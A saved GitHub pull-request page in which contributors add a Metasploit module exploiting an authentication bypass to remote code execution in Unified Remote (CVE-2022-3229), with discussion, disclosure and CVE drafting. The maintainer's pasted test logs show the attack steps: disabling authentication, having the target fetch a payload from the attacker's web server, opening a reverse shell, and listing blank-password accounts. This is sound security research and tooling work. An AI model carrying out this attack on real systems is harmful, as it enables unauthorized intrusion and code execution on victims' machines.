=== Content from github.com_68d297f0_20250114_182347.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16989)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16989)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  42](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# unified\_remote exploit #16989

 Merged

[cdelafuente-r7](/cdelafuente-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[h00die:unified\_remote](/h00die/metasploit-framework/tree/unified_remote "h00die/metasploit-framework:unified_remote")

Sep 21, 2022

 Merged

# [unified\_remote exploit](#top) #16989

[cdelafuente-r7](/cdelafuente-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[h00die:unified\_remote](/h00die/metasploit-framework/tree/unified_remote "h00die/metasploit-framework:unified_remote")

Sep 21, 2022

[Conversation
33](/rapid7/metasploit-framework/pull/16989)
[Commits
7](/rapid7/metasploit-framework/pull/16989/commits)
[Checks
0](/rapid7/metasploit-framework/pull/16989/checks)
[Files changed](/rapid7/metasploit-framework/pull/16989/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![h00die](https://avatars.githubusercontent.com/u/752491?s=60&v=4)](/h00die)

Copy link

Contributor

### @h00die **[h00die](/h00die)** commented [Sep 7, 2022](#issue-1363985943)

A similar exploit to [#16985](https://github.com/rapid7/metasploit-framework/pull/16985)

This PR adds a new module to exploit an auth bypass to rce in 'unified remote'.

Leaving it draft right now, talking to [@todb](https://github.com/todb) / [@todb-r7](https://github.com/todb-r7) about a possible CVE for it. Also needs a real description and docs, but wanted to post for gathering info on the CVE stuff.

[@H4rk3nz0](https://github.com/H4rk3nz0) looks like you were the original author (and your twitter is gone), did you ever reach out to the company to responsibly disclose? If so, can you post details so we can possibly get this CVEd as well? Its still valid against the most recent version.

This is a neat exploit as you connect to the WEB server (no auth) to pull the config, then set the RDP-ish auth to be none if needed. Then connect to the service and ask it to open cmd, then type out what you want on the user's screen. its fun to watch shell code :). Wrote in a cmdstager method, but due to the buffering and timeouts, decided to remove it as it just wasn't a good fit at all unfortunately. used [@H4rk3nz0](https://github.com/H4rk3nz0)'s original method which uses the host to host the payload on a web server and just download it. MUCH faster and more reliable.

## Verification

* install and start software. i tried it on the one linked in EDB and the most recent one on the website
* Start `msfconsole`
* `use exploit/windows/misc/unified_remote`
* Set `rhost` and `lhost` as required.
* `run`
* **Verify** it works with an auth method not none, and with none
* **Document** looks good

Sorry, something went wrong.

All reactions

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[unified_remote exploit](/rapid7/metasploit-framework/pull/16989/commits/c7b8ec7511d3abfa5f291782fe4a7449eee00389 "unified_remote exploit")`

`[c7b8ec7](/rapid7/metasploit-framework/pull/16989/commits/c7b8ec7511d3abfa5f291782fe4a7449eee00389)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
added
[module](/rapid7/metasploit-framework/labels/module)
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
labels
[Sep 7, 2022](#event-7334825722)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)

Copy link

### **[github-actions](/apps/github-actions) bot** commented [Sep 7, 2022](#issuecomment-1238819377)

| Thanks for your pull request! Before this can be merged, we need the following documentation for your module:   * [Writing Module Documentation](https://github.com/rapid7/metasploit-framework/wiki/Writing-Module-Documentation) * [Template](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/module_doc_template.md) * [Examples](https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules) |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 7, 2022](#issuecomment-1238820606)

| [@H4rk3nz0](https://github.com/H4rk3nz0) wanted to show you <https://github.com/rapid7/metasploit-framework/pull/16989/files#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547R133> . In your original POC you had `da`, `d8`, `dc`, ut all those call outs for 'space' and such weren't needed as it was just changing the body length variable. |
| --- |

All reactions

Sorry, something went wrong.

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 7, 2022](#issuecomment-1239028451)

| [@h00die](https://github.com/h00die) thanks for the cool module writeup, never did get far with dissecting what everything in the hex body was doing : ) . I do recall reaching out to unified remote through their on site contact at the time of testing unified remote (~ mid February 2021). I am having trouble finding the exact date of that correspondence as it was just a response from them stating that they don't consider it a problem as users are able to set authentication passwords for the web console which was disabled by default. I didn't chase for a CVE at the time. Will let you know if I can locate an exact date but it may be lost to the digital ether. |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 8, 2022](#issuecomment-1241185199)

| [@H4rk3nz0](https://github.com/H4rk3nz0) interesting. I see how you can disable the web console (its enabled by default), but not how to 'secure' it. I see you can set creds for the remote portion, but we can bypass that *if* the web console is enabled. Seems like things aren't adding up, but i guess we can move forward w/o a CVE. I'm adding in some checks now for the site being down, and then will push this up for review |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[unified_remote exploit](/rapid7/metasploit-framework/pull/16989/commits/ae91cfa9c5503b4e41b55277c0417f3570dff3ec "unified_remote exploit")`

`[ae91cfa](/rapid7/metasploit-framework/pull/16989/commits/ae91cfa9c5503b4e41b55277c0417f3570dff3ec)`

 [![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
marked this pull request as ready for review
[September 8, 2022 21:09](#event-7351523342)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 8, 2022](#issuecomment-1241236895)

| [@H4rk3nz0](https://github.com/H4rk3nz0) if you have time, give this module a try and let me know how its working for you. |
| --- |

All reactions

Sorry, something went wrong.

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)
[cdelafuente-r7](/cdelafuente-r7)
removed
the
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
label
[Sep 9, 2022](#event-7356769393)

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)
[cdelafuente-r7](/cdelafuente-r7)
self-assigned this
[Sep 9, 2022](#event-7356775093)

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)
[cdelafuente-r7](/cdelafuente-r7)
added
the
[docs](/rapid7/metasploit-framework/labels/docs)
label
[Sep 9, 2022](#event-7357536887)

[![cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=60&v=4)](/cdelafuente-r7)

**[cdelafuente-r7](/cdelafuente-r7)**
reviewed
[Sep 13, 2022](#pullrequestreview-1104351664)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16989/files/ae91cfa9c5503b4e41b55277c0417f3570dff3ec)

Copy link

Contributor

### @cdelafuente-r7 **[cdelafuente-r7](/cdelafuente-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks [@h00die](https://github.com/h00die) for this module! I just left a few minor comments for you to review when you get a chance.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/ae91cfa9c5503b4e41b55277c0417f3570dff3ec#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/ae91cfa9c5503b4e41b55277c0417f3570dff3ec#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/ae91cfa9c5503b4e41b55277c0417f3570dff3ec#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[review comments for unified remote](/rapid7/metasploit-framework/pull/16989/commits/59d79e3149e5681a10d28b9af87f9f64698f1f01 "review comments for unified remote")`

`[59d79e3](/rapid7/metasploit-framework/pull/16989/commits/59d79e3149e5681a10d28b9af87f9f64698f1f01)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 14, 2022](#issuecomment-1247292682)

| [@H4rk3nz0](https://github.com/H4rk3nz0) can you please confirm there is a way to auth the web page controller? i don't see that option anywhere, just 'turn it off and on' |
| --- |

All reactions

Sorry, something went wrong.

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 14, 2022](#issuecomment-1247404786)

| Hi [@h00die](https://github.com/h00die) I believe I misunderstood the functionality of the password feature at the time. I am unable to secure web console outside of completely disabling it.  Also I thought this may interest you as a potential improvement to the current script that can remove the possibility of user interacting interrupting the payload process:  <https://pastebin.com/raw/VMeWckHA>  I have attached a modified script (rough and quick edit apologies) as unified remote has a 'premium feature' for the mobile app that allows executing commands remotely as a 'utility function' naturally not too hard to figure out what is controlling length of string set as command payload. It all happens out of view of the GUI. Let me know what you think, cheers. |
| --- |

All reactions

Sorry, something went wrong.

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 14, 2022](#issuecomment-1247405405)

| Quick extra note - any command output is returned in TCP response from the unified remote server as a Result: if that is of interest. |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 15, 2022](#issuecomment-1248508978)

| pushing back to draft while looking at the improvements |
| --- |

All reactions

Sorry, something went wrong.

 [![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
marked this pull request as draft
[September 15, 2022 19:15](#event-7397686765)

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Sep 15, 2022](#issuecomment-1248538263) • edited Loading

| Hi [@h00die](https://github.com/h00die) and [@H4rk3nz0](https://github.com/H4rk3nz0)  So for a CVE, let's gather this in one place, so I can release [@smcintyre-r7](https://github.com/smcintyre-r7) and/or [@mkienow-r7](https://github.com/mkienow-r7) to actually do the CVE assignment.  Here's the CVE distillation:  Title: Unified Intents AB Unified Remote Improper Authorization Vulnerable Software/Component name: Unified Remote Vendor/Project name: Unified Intents AB Vulnerable Version Number: 3.11.0.2483 (50) CWE: CWE-285 Improper Authorization Short Description: Because the web management interface for Unified Intents' Unified Remote solution does not itself require authentication, a remote, unauthenticated attacker can change or disable authentication requirements for the Unified Remote protocol, and leverage this now-unauthenticated access to run code of the attacker's choosing. |
| --- |

All reactions

Sorry, something went wrong.

[![@mkienow-r7](https://avatars.githubusercontent.com/u/33330829?s=80&u=5f08d01e61fcdbb0f96771f14002c6f4e3802345&v=4)](/mkienow-r7)

Copy link

Contributor

### **[mkienow-r7](/mkienow-r7)** commented [Sep 15, 2022](#issuecomment-1248552838)

| Reserved CVE ID `CVE-2022-3229`. |
| --- |

 👍
1
 todb-r7 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

 [h00die](/h00die)
added 2 commits
[September 18, 2022 19:02](#commits-pushed-271171f)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[unified now with invisible feature](/rapid7/metasploit-framework/pull/16989/commits/271171f6d2493b5e1cde5a617562218526161529 "unified now with invisible feature")`

`[271171f](/rapid7/metasploit-framework/pull/16989/commits/271171f6d2493b5e1cde5a617562218526161529)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[add cve](/rapid7/metasploit-framework/pull/16989/commits/7fe4f282e4734a2adcc77461ecc8dee4e4dd88ff "add cve")`

`[7fe4f28](/rapid7/metasploit-framework/pull/16989/commits/7fe4f282e4734a2adcc77461ecc8dee4e4dd88ff)`

 [![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
marked this pull request as ready for review
[September 18, 2022 23:04](#event-7409570266)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 18, 2022](#issuecomment-1250405704)

| [@H4rk3nz0](https://github.com/H4rk3nz0) implemented the new hidden script mode. Works great. added docs and cve.  PS [@H4rk3nz0](https://github.com/H4rk3nz0) congrats on getting 2 CVEs and hopefully soon 2 modules in metasploit! May be almost a year after discovery, but better late than never! |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 19, 2022](#issuecomment-1250447759) • edited Loading

| [@H4rk3nz0](https://github.com/H4rk3nz0) was the name 'update' something you set in the script name? Seemed like it, but i forgot to test making that variable before updating the PR |
| --- |

All reactions

Sorry, something went wrong.

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 19, 2022](#issuecomment-1250698347)

| [@h00die](https://github.com/h00die) , thanks for the hard work transcribing the scripts to msf modules. Your hard work is much appreciated. With regards to 'update' I assume you're referring to within the hex and call for the 'invisible' feature? As I understand it, the invisible command execution feature creates a batch file on Windows and a bash file on linux hosts which it makes calls to 'update' the content of then executes it in a following call and returns the output. <https://www.unifiedremote.com/remotes/command>  As I understand it despite being a 'pro' feature the invisible option should work by default on all unified remote installations. Also a quick note: I see you included the pastebin url I shared as a reference but please be aware that pastebin will expire in 9 days time from now. I didn't expect that you would include it, my apologies. If you would like to modify that and create a more permanent store then by all means. |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 19, 2022](#issuecomment-1251445956)

| after testing, the word 'update' is not changeable, its part of the protocol.  [@H4rk3nz0](https://github.com/H4rk3nz0) I'll leave the ref in there for the time being incase there's any other changes during testing |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[remove bad ref](/rapid7/metasploit-framework/pull/16989/commits/5c35a8d3fd517634166f0634c0f6989796bb765f "remove bad ref")`

`[5c35a8d](/rapid7/metasploit-framework/pull/16989/commits/5c35a8d3fd517634166f0634c0f6989796bb765f)`

[![cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=60&v=4)](/cdelafuente-r7)

**[cdelafuente-r7](/cdelafuente-r7)**
reviewed
[Sep 20, 2022](#pullrequestreview-1114282614)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16989/files/5c35a8d3fd517634166f0634c0f6989796bb765f)

Copy link

Contributor

### @cdelafuente-r7 **[cdelafuente-r7](/cdelafuente-r7)** left a comment • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks [@h00die](https://github.com/h00die) for your updates. I just left a few minor comments before it lands. I tested with all the different configurations you described in the documentation and it works great.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/5c35a8d3fd517634166f0634c0f6989796bb765f#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/5c35a8d3fd517634166f0634c0f6989796bb765f#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/5c35a8d3fd517634166f0634c0f6989796bb765f#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/5c35a8d3fd517634166f0634c0f6989796bb765f#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)
Outdated

Show resolved

Hide resolved

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[unified remote review](/rapid7/metasploit-framework/pull/16989/commits/9e6c172dd449f25333fe9dff069026b39a7c1a82 "unified remote review")`

`[9e6c172](/rapid7/metasploit-framework/pull/16989/commits/9e6c172dd449f25333fe9dff069026b39a7c1a82)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 20, 2022](#issuecomment-1252896751)

| should be good to go! |
| --- |

All reactions

Sorry, something went wrong.

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=80&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)

Copy link

Contributor

### **[cdelafuente-r7](/cdelafuente-r7)** commented [Sep 21, 2022](#issuecomment-1253615615)

| Thanks [@h00die](https://github.com/h00die) for updating this. Everything looks good to me now. I tested multiple scenarios against Unified Remote version 3.11.0.2483(50) on Windows 11 and verify it works as expected. I'll go ahead and land it. Example output Tested against Unified Remote version 3.11.0.2483(50) on Windows 11  No authentication - visible true ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=true  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-95DshytVePd24tlG [*] 10.0.0.81:9512 - Retrieving server config [+] 10.0.0.81:9512 - No security enabled [+] 10.0.0.81:9512 - Found account: admin [+] 10.0.0.81:9512 - Found account: msfuser [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Opening Start Menu [*] 10.0.0.81:9512 - Opening command prompt [*] 10.0.0.81:9512 - Typing out payload [*] 10.0.0.81:9512 - Attempting to open payload [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] Command shell session 1 opened (10.0.0.1:4444 -> 10.0.0.81:49995) at 2022-09-21 13:49:22 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\L3jbM5pW.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\Users\n00tmeg>whoami whoami desktop-26cqrhp\n00tmeg  C:\Users\n00tmeg>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\Users\n00tmeg>exit exit  [*] 10.0.0.81 - Command shell session 1 closed.  Reason: User exit msf6 exploit(windows/misc/unified_remote_rce) > creds Credentials ===========  host             origin           service                public   private  realm  private_type    JtR Format ----             ------           -------                ------   -------  -----  ------------    ---------- 10.0.0.81  10.0.0.81  9512/tcp (wifi mouse)  admin                    Blank password 10.0.0.81  10.0.0.81  9512/tcp (wifi mouse)  msfuser                  Blank password  ```   No authentication - visible false ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=false  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-tDfVeyZv8mxrOlWz [*] 10.0.0.81:9512 - Retrieving server config [+] 10.0.0.81:9512 - No security enabled [+] 10.0.0.81:9512 - Found account: admin [+] 10.0.0.81:9512 - Found account: msfuser [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Loading Unified.Command [*] 10.0.0.81:9512 - Updating Unified.Command [*] 10.0.0.81:9512 - Sending payload [*] 10.0.0.81:9512 - Executing script [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] Command shell session 2 opened (10.0.0.1:4444 -> 10.0.0.81:50906) at 2022-09-21 13:53:46 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\0ZCveCmHMEWfJ.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\ProgramData\Unified Remote\Remotes\Bundled\Unified\Main\Command>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\ProgramData\Unified Remote\Remotes\Bundled\Unified\Main\Command>exit exit  ```   Group authentication - visible true ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=true  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-j3bhA09vMPvXb8vQ [*] 10.0.0.81:9512 - Retrieving server config [*] 10.0.0.81:9512 - anonymous mode enabled, password required, bypassing [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [+] 10.0.0.81:9512 - Found account: admin [+] 10.0.0.81:9512 - Found account: msfuser [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Opening Start Menu [*] 10.0.0.81:9512 - Opening command prompt [*] 